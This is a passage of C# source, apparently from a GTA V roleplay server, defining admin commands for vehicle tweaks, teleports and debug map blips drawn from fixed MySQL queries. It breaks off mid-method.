using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using GTANetworkAPI;
using MySql.Data.MySqlClient;
using Newtonsoft.Json;
using VMP_CNR.Handler;
using VMP_CNR.Module.Chat;
using VMP_CNR.Module.Commands;
using VMP_CNR.Module.Houses;
using VMP_CNR.Module.Logging;
using VMP_CNR.Module.Menu;
using VMP_CNR.Module.Players;
using VMP_CNR.Module.Players.Db;
using VMP_CNR.Module.Players.PlayerAnimations;
using VMP_CNR.Module.Players.Ranks;
using VMP_CNR.Module.Spawners;
using VMP_CNR.Module.Teams;
using VMP_CNR.Module.Teams.Permission;
using VMP_CNR.Module.Time;
using VMP_CNR.Module.Vehicles;
using VMP_CNR.Module.Vehicles.Data;
using VMP_CNR.Module.Players.Events;
using VMP_CNR.Module.Injury;
using VMP_CNR.Module.Customization;
using VMP_CNR.Module.Items;
using VMP_CNR.Module.Voice;
using Task = System.Threading.Tasks.Task;
using Vehicle = GTANetworkAPI.Vehicle;
using VMP_CNR.Module.Players.Windows;
using VMP_CNR.Module.ClientUI.Components;
using VMP_CNR.Module.Weapons.Data;
using static VMP_CNR.Module.Chat.Chats;
using VMP_CNR.Module.Players.Drunk;
using VMP_CNR.Module.Vehicles.Garages;
using VMP_CNR.Module.Business.FuelStations;
using VMP_CNR.Module.Business.Raffinery;
using VMP_CNR.Module.Business.NightClubs;
using Configuration = VMP_CNR.Module.Configurations.Configuration;
using VMP_CNR.Module.Zone;
using VMP_CNR.Module.Players.Commands;
using static VMP_CNR.Module.Players.PlayerNotification;
using VMP_CNR.Module.Business;
using VMP_CNR.Module.PlayerName;
using VMP_CNR.Module.Attachments;
using VMP_CNR.Module.Dealer;
using VMP_CNR.Module.Kasino;
using VMP_CNR.Module.Clothes;
using VMP_CNR.Module.Configurations;
using VMP_CNR.Module.Laboratories;
using VMP_CNR.Module.Banks;
using VMP_CNR.Module.Storage;
using VMP_CNR.Module.Gangwar;
using VMP_CNR.Module.Jails;
using VMP_CNR.Module.Space;
using System.Diagnostics;
using VMP_CNR.Module.Weather;
using VMP_CNR.Module.Procedures;
using VMP_CNR.Module.Admin.Procedures;
using System.Net;

namespace VMP_CNR.Module.Admin
{
    public class AdminModuleCommands : Script
    {
        private static readonly bool Devmode = Configuration.Instance.DevMode;


        public int getTeamColor(int rankId)
        {
            switch (rankId)
            {
                case 1: return 0;
                case 2: return 2;
                case 3: return 4;
                case 4: return 3;
                case 5:
                case 6: return 9;
                case 12:
                case 8: return 10;

                default: return 0;

            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggleevent(Player player)
        {
            DbPlayer dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.IsValid())
                return;

            if (!dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Configuration.Instance.EventActive = !Configuration.Instance.EventActive;

            if (Configuration.Instance.EventActive)
                dbPlayer.SendNewNotification("Event-Funk wurde freigegeben! Frequenz: 8888.1-9");
            else
                dbPlayer.SendNewNotification("Event-Funk wurde wieder deaktiviert.");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void debugjumppoints(Player player)
        {
            if (!Configuration.Instance.DevMode)
                return;

            DbPlayer dbPlayer = player.GetPlayer();
            if (dbPlayer == null)
                return;

            Configuration.Instance.ShowAllJumppoints = !Configuration.Instance.ShowAllJumppoints;
            string msg = Configuration.Instance.ShowAllJumppoints
                ? "Jump-Points Debug aktiviert! Es werden nun Notifications für ALLE Jumppoints angezeigt!"
                : "Jump-Points Debug deaktiviert.";

            dbPlayer.SendNewNotification(msg, NotificationType.ADMIN, "DEBUG", 10000);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vdoor(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!l_DbPlayer.RageExtension.IsInVehicle)
            {
                l_DbPlayer.SendNewNotification("Du musst in einem Fahrzeug sein!", NotificationType.ADMIN, "Fehler");
                return;
            }

            var l_Vehicle = p_Player.Vehicle;
            var l_Handler = new VehicleEventHandler();
            l_Handler.ToggleDoorState(p_Player, l_Vehicle, Convert.ToUInt32(p_Door));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vhp(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!l_DbPlayer.RageExtension.IsInVehicle)
            {
                l_DbPlayer.SendNewNotification("Du musst in einem Fahrzeug sein!", NotificationType.ADMIN, "Fehler");
                return;
            }

            if (!Int32.TryParse(p_Door, out int hp)) return;

            var l_Vehicle = p_Player.Vehicle;
            if (l_Vehicle == null) return;

            NAPI.Task.Run(async () =>
            {
                l_DbPlayer.SendNewNotification("actualhp " + l_Vehicle.Health);

                l_Vehicle.Health = hp;
            });

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vdoor2(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            SxVehicle sxVehicle = VehicleHandler.Instance.GetClosestVehicle(p_Player.Position, 2.0f, 0);
            var l_Handler = new VehicleEventHandler();

            if (sxVehicle != null && sxVehicle.IsValid())
            {
                l_Handler.ToggleDoorState(p_Player, sxVehicle.Entity, Convert.ToUInt32(p_Door));
            }
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void attachmeto(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            DbPlayer target = Players.Players.Instance.FindPlayer(p_Door);
            if (target != null && target.IsValid())
            {
                l_DbPlayer.Player.TriggerNewClient("attachmeto", target.Player);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void loadcheckpoint(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            l_DbPlayer.Player.TriggerNewClient("loadcheckpoint");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void unloadcheckpoint(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            l_DbPlayer.Player.TriggerNewClient("unloadcheckpoint");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void loadcrate(Player p_Player, string args)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 4) return;
            if (!int.TryParse(strings[0], out int size)) return;
            if (!int.TryParse(strings[1], out int number)) return;
            if (!int.TryParse(strings[2], out int weapon)) return;
            if (!int.TryParse(strings[3], out int ramp)) return;

            if (number < 0 || number > 6) return;
            if (size < 1 || size > 4)
                l_DbPlayer.SendNewNotification($"Event triggert: {number}");
            l_DbPlayer.SendNewNotification($"Dimension: {l_DbPlayer.Player.Dimension}");
            l_DbPlayer.Player.TriggerNewClient("loadStorageRoom", size, number, weapon, ramp, l_DbPlayer.Player.Dimension);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void unloadcrate(Player p_Player, string p_Door)
        {
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            l_DbPlayer.Player.TriggerNewClient("unloadStorageRoom");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void carmod(Player player, string args)
        {
            //int interiorid, string propname, int color
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            var sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
            if (sxVeh == null) return;

            string[] strings = args.Split(" ");
            if (strings.Length < 2) return;
            if (!int.TryParse(strings[0], out int type)) return;
            if (!int.TryParse(strings[1], out int mod)) return;

            NAPI.Vehicle.SetVehicleMod(sxVeh.Entity, type, mod);
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void livery(Player player, string liveryindex)
        {
            //int interiorid, string propname, int color
            var dbPlayer = player.GetPlayer();

            if (!Int32.TryParse(liveryindex, out int liveryindexint)) return;

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            var sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
            if (sxVeh == null) return;

            player.TriggerNewClient("livery", sxVeh.Entity, liveryindexint);

        }

        public static List<Blip> labblips = new List<Blip>();
        public static Marker innerMarker;
        public static Marker outerMarker;
        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void marker(Player player, string args)
        {
            if (!Configuration.Instance.DevMode)
                return;

            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 2) return;

            if (!int.TryParse(strings[0], out int min)) return;
            if (!int.TryParse(strings[1], out int max)) return;

            if (labblips.Count > 0)
                labblips.ForEach(blip => blip.Delete());
            labblips.Clear();

            for (int i = 0; i < 360; i += 6)
            {
                double angle = Math.PI * i / 180.0;
                double sinAngle = Math.Sin(angle);
                double cosAngle = Math.Cos(angle);
                Vector3 innerPos = dbPlayer.Player.Position.Add(new Vector3(min * cosAngle, min * sinAngle, 0));
                Vector3 outerPos = dbPlayer.Player.Position.Add(new Vector3(max * cosAngle, max * sinAngle, 0));
                if (i % 18 == 0)
                    labblips.Add(Blips.Create(innerPos, "", 103, 1.0f, true, 49, 255));
                labblips.Add(Blips.Create(outerPos, "", 103, 1.0f, true, 69, 255));
            }
        }

        public static List<Blip> methBlips = new List<Blip>();
        public static List<Marker> methMarker = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void loadplanningroom(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 6) return;
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.Player.TriggerNewClient("loadplanningroom", strings[0], strings[1], strings[2], strings[3], strings[4], strings[5]);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void unloadplanningroom(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.Player.TriggerNewClient("unloadplanningroom");
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void showlabs(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            if (!int.TryParse(myString, out int scale)) return;
            if (Main.ServerBlips.Count > 0)
                Main.ServerBlips.ForEach(blip => blip.Scale = ((float)scale) / 100);

            if (methBlips.Count > 0)
            {
                methBlips.ForEach(blip => blip.Delete());
                if (methMarker.Count > 0)
                    methMarker.ForEach(marker => marker.Delete());
                methBlips.Clear();
                methMarker.Clear();
                return;
            }
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    string query =
                        $"SELECT * FROM `jump_points` WHERE `destionation` in ('287','293','309','315','321','327','333','339','345','351','357') order by `teams`;";
                    using (var conn = new MySqlConnection(Configuration.Instance.GetMySqlConnection()))
                    using (var cmd = conn.CreateCommand())
                    {
                        conn.Open();
                        cmd.CommandText = @query;
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    Vector3 pos = new Vector3(reader.GetFloat("pos_x"), reader.GetFloat("pos_y"), reader.GetFloat("pos_z"));
                                    int teamId = reader.GetInt32("teams");
                                    NAPI.Task.Run(() =>
                                    {
                                        methBlips.Add(Blips.Create(pos, $"Labor - TeamId: {teamId}", 403, 1.0f, true, TeamModule.Instance.GetById(teamId).BlipColor, 255));
                                        methMarker.Add(Markers.Create(1, pos.Add(new Vector3(0, 0, -1f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 255, 0, 0, 0));
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gotostorage(Player p_Player, string myString)
        {
            //if (!Configuration.Instance.DevMode) return;

            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!uint.TryParse(myString, out uint id)) return;
            StorageRoom storageRoom = StorageRoomModule.Instance.Get(id);

            l_DbPlayer.Player.SetPosition(storageRoom.Position);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gotointerior(Player p_Player, string myString)
        {
            //if (!Configuration.Instance.DevMode) return;

            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!uint.TryParse(myString, out uint id)) return;
            var interior = InteriorModule.Instance.Get(id);

            l_DbPlayer.Player.SetPosition(interior.Position);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gotofrak(Player p_Player, string myString)
        {
            //if (!Configuration.Instance.DevMode) return;

            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!uint.TryParse(myString, out uint id)) return;
            Team team = TeamModule.Instance.GetById((int)id);
            l_DbPlayer.Player.SetPosition(team.TeamSpawns[0].Position);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createjumppoint(Player p_Player)
        {
            //if (!Configuration.Instance.DevMode) return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            ProcedureModule.Instance.CreateProcedure(l_DbPlayer, new CreateJumppointCommandProcedure());
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void dstorage(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            StorageRoomModule.Instance.GetAll().Values.ToList().ForEach(room =>
            {
                StorageRoomModule.Instance.GetAll().Values.ToList().ForEach(innerRoom =>
                {
                    if (room.Id != innerRoom.Id && room.Position.DistanceTo(innerRoom.Position) <= 2.0f)
                    {
                        Console.WriteLine($"StorageRoom Problem! {room.Id} & {innerRoom.Id} are too close!");
                    }
                });
            });
        }

        public static List<Blip> storageRoomBlips = new List<Blip>();
        public static List<Marker> storageRoomMarker = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void showstorages(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!int.TryParse(myString, out int scale)) return;
            if (Main.ServerBlips.Count > 0)
                Main.ServerBlips.ForEach(blip => blip.Scale = ((float)scale) / 100);

            if (storageRoomBlips.Count > 0)
            {
                storageRoomBlips.ForEach(blip => blip.Delete());
                if (storageRoomMarker.Count > 0)
                    storageRoomMarker.ForEach(marker => marker.Delete());
                storageRoomBlips.Clear();
                storageRoomMarker.Clear();
                return;
            }
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    string query =
                        $"SELECT * FROM `storage_rooms`;";
                    using (var conn = new MySqlConnection(Configuration.Instance.GetMySqlConnection()))
                    using (var cmd = conn.CreateCommand())
                    {
                        conn.Open();
                        cmd.CommandText = @query;
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    Vector3 pos = new Vector3(reader.GetFloat("pos_x"), reader.GetFloat("pos_y"), reader.GetFloat("pos_z"));
                                    NAPI.Task.Run(() =>
                                    {
                                        storageRoomBlips.Add(Blips.Create(pos, $"StorageRoom", 478, 1.0f, true, 1, 255));
                                        storageRoomMarker.Add(Markers.Create(1, pos.Add(new Vector3(0, 0, -1f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 255, 0, 0, 0));
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        public static List<Blip> gangwarBlips = new List<Blip>();
        public static List<Marker> gangwarMarker = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void showgangwar(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (Main.ServerBlips.Count > 0)
                Main.ServerBlips.ForEach(blip => blip.Scale = (0.1f));

            if (gangwarBlips.Count > 0)
            {
                gangwarBlips.ForEach(blip => blip.Delete());
                if (gangwarMarker.Count > 0)
                    gangwarMarker.ForEach(marker => marker.Delete());
                gangwarBlips.Clear();
                gangwarMarker.Clear();
                return;
            }
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    string query =
                        $"SELECT * FROM `gangwar_towns`;";
                    using (var conn = new MySqlConnection(Configuration.Instance.GetMySqlConnection()))
                    using (var cmd = conn.CreateCommand())
                    {
                        conn.Open();
                        cmd.CommandText = @query;
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    int id = reader.GetInt32("id");
                                    Vector3 Position = new Vector3(reader.GetFloat("pos_x"), reader.GetFloat("pos_y"), reader.GetFloat("pos_z"));
                                    Vector3 Flag_1 = new Vector3(reader.GetFloat("flag_1_pos_x"), reader.GetFloat("flag_1_pos_y"), reader.GetFloat("flag_1_pos_z"));
                                    Vector3 Flag_2 = new Vector3(reader.GetFloat("flag_2_pos_x"), reader.GetFloat("flag_2_pos_y"), reader.GetFloat("flag_2_pos_z"));
                                    Vector3 Flag_3 = new Vector3(reader.GetFloat("flag_3_pos_x"), reader.GetFloat("flag_3_pos_y"), reader.GetFloat("flag_3_pos_z"));
                                    float Range = reader.GetFloat("range");
                                    Color color = GangwarModule.Instance.StandardColor;
                                    NAPI.Task.Run(() =>
                                    {
                                        gangwarBlips.Add(Blips.Create(Position, "Gangwargebiet", 543, 1.0f, color: 0));
                                        gangwarBlips.Add(Blips.Create(Flag_1, "Gangwargebiet", 38, 1.0f, color: 1));
                                        gangwarBlips.Add(Blips.Create(Flag_2, "Gangwargebiet", 38, 1.0f, color: 1));
                                        gangwarBlips.Add(Blips.Create(Flag_3, "Gangwargebiet", 38, 1.0f, color: 1));
                                        gangwarMarker.Add(Spawners.Markers.Create(4, Flag_1, new Vector3(), new Vector3(), 1.0f, color.Alpha, color.Red, color.Green, color.Blue, 0));
                                        gangwarMarker.Add(Spawners.Markers.Create(4, Flag_2, new Vector3(), new Vector3(), 1.0f, color.Alpha, color.Red, color.Green, color.Blue, 0));
                                        gangwarMarker.Add(Spawners.Markers.Create(4, Flag_3, new Vector3(), new Vector3(), 1.0f, color.Alpha, color.Red, color.Green, color.Blue, 0));
                                        gangwarMarker.Add(NAPI.Marker.CreateMarker(1, Position.Add(new Vector3(0, 0, -30f)), new Vector3(), new Vector3(), 2 * Range, color, true, 0));
                                        gangwarMarker.Add(NAPI.Marker.CreateMarker(0, Position, new Vector3(), new Vector3(), 2.0f, new Color(255, 0, 0), true, 0));
                                        for (int i = 0; i < 360; i += 6)
                                        {
                                            double angle = Math.PI * i / 180.0;
                                            double sinAngle = Math.Sin(angle);
                                            double cosAngle = Math.Cos(angle);
                                            Vector3 innerPos = Position.Add(new Vector3(Range * cosAngle, Range * sinAngle, 0));
                                            labblips.Add(Blips.Create(innerPos, "", 103, 1.0f, true, 2, 255));
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void dhouse(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            HouseModule.Instance.GetAll().Values.ToList().ForEach(house =>
            {
                HouseModule.Instance.GetAll().Values.ToList().ForEach(innerHouse =>
                {
                    if (house.Id != innerHouse.Id && house.Position.DistanceTo(innerHouse.Position) <= 1.5f)
                    {
                        Console.WriteLine($"House Problem! {house.Id} & {innerHouse.Id} are too close!");
                    }
                });
            });
        }

        public static List<Blip> houseBlips = new List<Blip>();
        public static List<Marker> houseMarker = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void showhouses(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            string[] strings = myString.Split(" ");
            int scale = 10;
            int markerIndex = 0;
            if (strings.Length >= 1)
                int.TryParse(strings[0], out scale);
            if (strings.Length == 2)
                int.TryParse(strings[1], out markerIndex);
            if (Main.ServerBlips.Count > 0)
                Main.ServerBlips.ForEach(blip => blip.Scale = ((float)scale) / 100);

            if (houseBlips.Count > 0)
            {
                houseBlips.ForEach(blip => blip.Delete());
                if (houseMarker.Count > 0)
                    houseMarker.ForEach(marker => marker.Delete());
                houseBlips.Clear();
                houseMarker.Clear();
                return;
            }
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    string query =
                        $"SELECT * FROM `houses`;";
                    using (var conn = new MySqlConnection(Configuration.Instance.GetMySqlConnection()))
                    using (var cmd = conn.CreateCommand())
                    {
                        conn.Open();
                        cmd.CommandText = @query;
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    Vector3 pos = new Vector3(reader.GetFloat("posX"), reader.GetFloat("posY"), reader.GetFloat("posZ"));
                                    Vector3 colShapePos = new Vector3(reader.GetFloat("colshapeX"), reader.GetFloat("colshapeY"), reader.GetFloat("colshapeZ"));
                                    int id = reader.GetInt32("id");
                                    int type = reader.GetInt32("type");
                                    int price = reader.GetInt32("price");
                                    int ownerId = reader.GetInt32("ownerId");
                                    int maxrents = reader.GetInt32("maxrents");
                                    int garage = reader.GetInt32("garage");
                                    int BlipColor = 77;
                                    switch (type)
                                    {
                                        case 1:
                                            BlipColor = 1;
                                            break;
                                        case 2:
                                            BlipColor = 2;
                                            break;
                                        case 3:
                                            BlipColor = 5;
                                            break;
                                    }

                                    NAPI.Task.Run(() =>
                                    {
                                        houseBlips.Add(Blips.Create(pos, $"House: Id ({id}), type ({type}), price ({price}, maxrents ({maxrents}), garage ({maxrents})", 40, 1.0f, true, BlipColor, 255));
                                        if (markerIndex == 0)
                                        {
                                            if (l_DbPlayer.Player.Position.DistanceTo(pos) < 250.0f)
                                            {
                                                houseMarker.Add(Markers.Create(1, pos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 255, 0, 0, 0));
                                                houseMarker.Add(Markers.Create(1, colShapePos.Add(new Vector3(0, 0, 0.1f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 0, 255, 0, 0));

                                            }
                                        }
                                        else if (id >= markerIndex)
                                        {
                                            houseMarker.Add(Markers.Create(1, pos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 255, 0, 0, 0));
                                            houseMarker.Add(Markers.Create(1, colShapePos.Add(new Vector3(0, 0, 0.1f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 0, 255, 0, 0));
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        public static List<Blip> farmspotsBlips = new List<Blip>();
        public static List<Marker> farmspotsMarker = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void showfarmspots(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            string[] strings = myString.Split(" ");
            int scale = 10;
            int markerIndex = 0;
            if (strings.Length >= 1)
                int.TryParse(strings[0], out markerIndex);
            if (Main.ServerBlips.Count > 0)
                Main.ServerBlips.ForEach(blip => blip.Scale = ((float)scale) / 100);

            if (previewBlip != null)
                previewBlip.Delete();
            if (previewMarkers.Count > 0)
                previewMarkers.ForEach(marker => marker.Delete());

            if (farmspotsBlips.Count > 0)
            {
                farmspotsBlips.ForEach(blip => blip.Delete());
                if (farmspotsMarker.Count > 0)
                    farmspotsMarker.ForEach(marker => marker.Delete());
                farmspotsBlips.Clear();
                farmspotsMarker.Clear();
                return;
            }
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    string query =
                        $"SELECT * FROM `farm_positions`;";
                    using (var conn = new MySqlConnection(Configuration.Instance.GetMySqlConnection()))
                    using (var cmd = conn.CreateCommand())
                    {
                        conn.Open();
                        cmd.CommandText = @query;
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    Vector3 pos = new Vector3(reader.GetFloat("pos_x"), reader.GetFloat("pos_y"), reader.GetFloat("pos_z"));
                                    int id = reader.GetInt32("id");
                                    int farm_id = reader.GetInt32("farm_id");
                                    int range = reader.GetInt32("range");
                                    uint BlipType = 685 + (uint)farm_id;

                                    NAPI.Task.Run(() =>
                                    {
                                        farmspotsBlips.Add(Blips.Create(pos, $"FarmSpot-ID: {farm_id}", BlipType, 1.0f, true, 2, 255));
                                        if (farm_id == markerIndex)
                                        {
                                            farmspotsMarker.Add(Markers.Create(1, pos.Add(new Vector3(0, 0, 10f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 3.0f, 255, 255, 0, 0, 0));
                                            for (double i = 0; i < 360; i += 90)
                                            {
                                                double angle = Math.PI * i / 180.0;
                                                double sinAngle = Math.Sin(angle);
                                                double cosAngle = Math.Cos(angle);
                                                Vector3 innerPos = pos.Add(new Vector3(range * cosAngle, range * sinAngle, 0));
                                                farmspotsMarker.Add(Markers.Create(1, innerPos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 5.0f, 255, 0, 255, 0, 0));
                                            }
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        public static Blip previewBlip;
        public static List<Marker> previewMarkers = new List<Marker>();

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void previewfarmspot(Player p_Player, string args)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            string[] strings = args.Split(" ");
            if (!int.TryParse(strings[0], out int farm_id)) return;
            if (!int.TryParse(strings[1], out int range)) return;
